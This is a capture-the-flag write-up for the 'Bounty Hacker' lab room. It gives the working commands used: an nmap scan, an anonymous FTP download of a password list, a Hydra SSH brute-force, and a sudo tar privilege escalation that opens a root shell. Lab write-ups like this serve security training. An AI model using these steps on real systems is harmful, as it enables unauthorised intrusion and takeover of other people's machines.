## General Information
- Room: Bounty Hacker
- Difficulty: Easy
- Date: 12/11/2023
- Description: "You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!" 


## Methodology
- Utilized Nmap for initial reconnaissance.
- Exploited FTP service to retrieve files.
- Employed Hydra for SSH brute-force attack.
- Leveraged SSH for initial access.
- Discovered and exploited a privilege escalation vulnerability using GTFOBins.


## Results

### Reconnaissance
- IP: 10.10.217.109      
- Port Scan results:

| PORT   | STATE | SERVICE    | VERSION                                |
|--------|-------|------------|----------------------------------------|
| 21/tcp | open  | ftp        | vsftpd 3.0.3                           |
| 22/tcp | open  | ssh        | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http       | Apache httpd 2.4.18 (Ubuntu)            |

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

### Tools and Exploitation

#### Nmap Scan
~~~nmap
nmap -sV -oN nmap_scan.txt 10.10.217.109 
~~~

#### FTP
~~~ftp
ftp 10.10.217.109                        
Name (10.10.217.109:kali): anonymous
ftp> get locks.txt
ftp> get task.txt
~~~

#### Hydra SSH Brute-force
~~~hydra
$ hydra -l lin -P locks.txt ssh://10.10.217.109
~~~

#### SSH Access
~~~ ssh
$ ssh lin@10.10.217.109
~~~

#### Privilege Escalation (GTFOBins)
~~~ GTFOBins
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
~~~


### Exploited Vulnerabilities
- FTP Anonymous Login: Exploited anonymous FTP login to retrieve files locks.txt and task.txt.
- SSH Brute-force: Successfully gained access to SSH using Hydra and the provided password file.
- Privilege Escalation: Exploited the sudo configuration for tar command to gain root access using the GTFOBins technique.